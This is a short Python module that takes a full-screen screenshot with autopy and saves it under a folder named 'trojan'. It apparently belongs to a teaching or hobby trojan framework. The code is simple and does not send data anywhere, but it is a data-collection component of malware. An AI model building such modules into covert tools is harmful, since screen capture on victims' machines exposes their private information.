import autopy
import time

def run(**args):
  print("taking screenshot...")
  time.sleep(2)
  b = autopy.bitmap.capture_screen()
  b.save("/root/Desktop/trojan/screenshot.png")

  return b
